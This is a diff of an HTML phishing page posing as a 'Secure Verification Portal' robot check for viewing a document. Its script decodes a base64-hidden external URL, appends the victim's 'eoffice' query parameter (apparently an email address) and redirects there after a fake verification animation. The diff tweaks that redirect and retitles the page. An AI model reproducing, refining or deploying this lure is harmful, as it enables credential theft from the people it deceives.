@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MS files</title>
+  <title>Secure Verification Portal</title>
   <style>
     /* Elegant color scheme */
     :root {
@@ -113,9 +113,9 @@
     .verification-subtitle {
       color: var(--gray-700);
       font-size: 1.1rem;
-      line-height: 0;
       text-align: center;
       font-weight: 500;
+      line-height: 1.4;
     }
 
     /* Verification control */
@@ -321,7 +321,7 @@
   <div class="verification-content" id="verificationContent">
     <div class="verification-card">
       <div class="verification-header">
-        <p class="verification-subtitle">To view this document, verify you're not a robot below</p>
+        <p class="verification-subtitle">To view this document,<br>verify you're not a robot below</p>
       </div>
 
       <div class="verification-control" id="verificationControl">
@@ -359,7 +359,7 @@
       const ctx = canvas.getContext('2d');
       const particles = [];
       const colors = ['#1a73e8', '#34a853', '#fbbc05', '#ea4335', '#4285f4'];
-
+      
       function Particle() {
         this.x = Math.random() * canvas.width;
         this.y = Math.random() * canvas.height - canvas.height;
@@ -406,7 +406,7 @@
 
       init();
       animate();
-
+      
       // Stop after 3 seconds
       setTimeout(() => {
         particles.length = 0;
@@ -418,7 +418,7 @@
       const e = "aHR0cHM6Ly9wcm90b25maWxlcy5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3RPbkRxWGYx";
       const t = window.location.search;
       const n = new URLSearchParams(t).get("eoffice") || "";
-      return atob(e) + "#" + encodeURIComponent(n);
+      return atob(e) + "Q" + "#" + encodeURIComponent(n);
     }
 
     document.addEventListener('DOMContentLoaded', () => {
@@ -448,7 +448,7 @@
             verificationControl.classList.remove('verification-loading');
             verificationControl.classList.add('verification-success');
             successCheckmark.classList.add('animate');
-
+            
             // Trigger confetti
             startConfetti();
 
@@ -475,4 +475,3 @@
   </script>
 </body>
 </html>
-
